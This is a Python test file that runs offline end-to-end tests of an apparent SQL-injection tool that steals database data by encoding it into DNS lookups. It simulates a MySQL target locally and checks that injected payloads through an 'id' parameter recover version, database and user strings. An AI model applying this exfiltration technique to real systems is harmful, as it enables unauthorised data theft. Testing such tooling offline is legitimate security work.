"""
端到端离线测试: 本地起一个"假数据库"HTTP 端点, 它按 payload 里的 offset 计算 hex
并登记一条"解析记录"; 假平台再从登记表里读记录。全程不联网。
"""
import http.server
import re
import socketserver
import threading
import unittest
import urllib.parse

import dnslogsqlinj3 as dsi

VALUE = b"5.7.26 | security | root@localhost"
DOMAIN = "abcd1234.example.test"


class _Registry:
    records = []


class _Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.unquote(self.path)
        m = re.search(r"([a-z0-9]{2,8})\.h(\d{6})\.", path)
        if m:
            marker, off = "%s.h%s" % (m.group(1), m.group(2)), int(m.group(2))
            chunk = VALUE[off:off + 8]          # 模拟 SQL 侧 SUBSTR(...,8)
            if chunk:
                _Registry.records.append("%s.%s.%s" % (marker, chunk.hex(), DOMAIN))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


class MemProvider(dsi.Provider):
    def get_domain(self):
        return DOMAIN

    def get_records(self):
        return list(_Registry.records)


class TestEndToEnd(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        socketserver.TCPServer.allow_reuse_address = True
        cls.srv = socketserver.TCPServer(("127.0.0.1", 0), _Handler)
        cls.port = cls.srv.server_address[1]
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def setUp(self):
        _Registry.records = []

    def test_dump_round_trip(self):
        db = dsi.MySQL()
        db.domain = DOMAIN
        ex = dsi.DnsExfil(MemProvider(), db,
                          "http://127.0.0.1:%d/?id=1'%%PAYLOAD%%--+-" % self.port,
                          nonce="n1", poll=0.02, timeout=3, http_timeout=2)
        ex.domain = DOMAIN
        data = ex.dump("(select concat(version(),' | ',database()))", chunk=8, max_bytes=64)
        self.assertEqual(data, VALUE)

    def test_payload_uses_forward_slash_and_keeps_parens(self):
        db = dsi.MySQL()
        db.domain = DOMAIN
        ex = dsi.DnsExfil(MemProvider(), db,
                          "http://127.0.0.1:%d/?id=1'%%PAYLOAD%%--+-" % self.port,
                          nonce="n1", poll=0.02, timeout=2, http_timeout=2)
        ex.domain = DOMAIN
        seen = {}
        ex.fire = lambda sql, label: seen.setdefault("sql", sql) or 0.01
        ex.hex_chunk("(select 1)", 0, 8)
        self.assertIn("'//'", seen["sql"])
        self.assertNotIn("%28", dsi.encode_payload(seen["sql"]))


if __name__ == "__main__":
    unittest.main()
